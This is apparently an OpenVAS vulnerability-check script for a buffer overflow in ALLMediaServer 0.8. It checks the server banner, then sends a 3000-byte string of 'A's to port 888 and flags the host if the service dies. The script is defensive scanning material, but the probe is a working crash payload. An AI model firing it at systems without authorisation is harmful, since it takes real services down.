if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802659" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 54475 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-07-17 12:12:12 +0530 (Tue, 17 Jul 2012)" );
	script_name( "ALLMediaServer Request Handling Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/49931" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54475" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/19625" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/114758/allmediaserver_bof.rb.txt" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 888 );
	script_mandatory_keys( "ALLPLAYER-DLNA/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
  code in the context of the application. Failed attacks will cause denial of service conditions." );
	script_tag( name: "affected", value: "ALLMediaServer version 0.8" );
	script_tag( name: "insight", value: "The flaw is due to a boundary error when processing certain
  network requests and can be exploited to cause a stack based buffer overflow
  via a specially crafted packet sent to TCP port 888." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running ALLMediaServer and is prone to buffer overflow
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 888 );
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: ALLPLAYER-DLNA" )){
	http_close_socket( soc );
	exit( 0 );
}
req = crap( data: "A", length: 3000 );
send( socket: soc, data: req );
http_close_socket( soc );
sleep( 3 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

